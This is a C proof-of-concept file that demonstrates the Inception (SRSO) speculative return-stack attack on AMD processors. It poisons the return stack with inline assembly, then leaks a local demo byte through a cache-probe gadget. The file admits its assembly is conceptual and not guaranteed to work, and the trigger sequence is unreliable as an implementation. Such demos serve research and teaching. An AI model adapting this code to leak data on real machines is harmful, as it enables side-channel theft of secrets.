#include "utils.c"

// --- Inception (Speculative Return Stack Overflow - SRSO) ---
// AMD-specific. Highly conceptual in C.

uint8_t secret_inception_data = 'I'; // Secret to leak

// Gadget function to leak a byte
__attribute__((noinline))
void leak_gadget_inception(uint8_t value) {
    probe_array[value * CACHE_LINE_SIZE] = 1;
}

// Victim function with a return instruction that will be misdirected speculatively.
__attribute__((noinline))
void victim_function_inception() {
    volatile int dummy = 0;
    for (int i = 0; i < 10; ++i) { dummy += i; }
    // Implicit 'ret' here is the target.
}

int main_inception() {
    common_init();
    printf("\n--- Running Inception (SRSO) Demo (AMD-specific) ---\n");

    // --- Poisoning Phase ---
    // This is the most architecture-specific part for Inception.
    // It involves causing a large number of "phantom CALLs" via specific instruction sequences.
    // The ETH Zurich paper points to XOR instructions being speculatively interpreted as CALLs.
    // This requires precise inline assembly to construct the "trigger code."
    printf("Triggering phantom speculation to overflow RAS...\n");

    // The actual code would be a highly-tuned inline assembly loop.
    // Example (conceptual, not guaranteed to work on any specific CPU):
    // The goal is to repeatedly execute instructions that AMD CPUs speculatively
    // misinterpret as CALLs, causing the RAS to be filled.
    // The addresses pushed onto the RAS are the attacker's "poison" values,
    // typically pointers to the `leak_gadget_inception`.
    
    // For a C-level conceptualization, we can only describe the goal:
    // Fill the RAS with `leak_gadget_inception` address.
    // This might involve:
    // 1. Setting up registers so that the "phantom CALL" uses `leak_gadget_inception` as target.
    // 2. Repeatedly executing a sequence of instructions (like `XOR`) that are known to
    //    trigger the phantom `CALL` behavior on the target AMD CPU.
    
    __asm__ __volatile__ (
        "mov %0, %%r8\n\t"        // Load gadget address into a register
        "mov %1, %%r9\n\t"        // Load secret into another register (conceptual)
        ".rept 256\n\t"           // Repeat many times to overflow RAS
        "xor %%eax, %%eax\n\t"    // Example instruction that might be mispredicted as a CALL
        "nop\n\t"                 // Padding
        "nop\n\t"
        "nop\n\t"
        ".endr\n"
        : : "r"(&leak_gadget_inception), "r"(secret_inception_data) : "rax", "r8", "r9" // Clobbered
    );
    _mm_mfence(); // Ensure RAS updates are visible globally

    // After poisoning, flush caches to remove noise from training.
    flush_probe_array();
    _mm_mfence();

    // --- Attack Phase ---
    flush_probe_array();
    _mm_lfence();
    
    printf("Triggering victim function with return...\n");
    victim_function_inception(); // This will execute a 'ret' instruction.
                                 // Speculatively, due to poisoned RAS, it returns to gadget.

    // Add a fence to ensure speculative effects propagate to cache
    _mm_lfence();

    // --- Measurement Phase ---
    perform_measurement(secret_inception_data, "Inception secret");
    printf("Actual secret data: %c\n", secret_inception_data);
    return 0;
}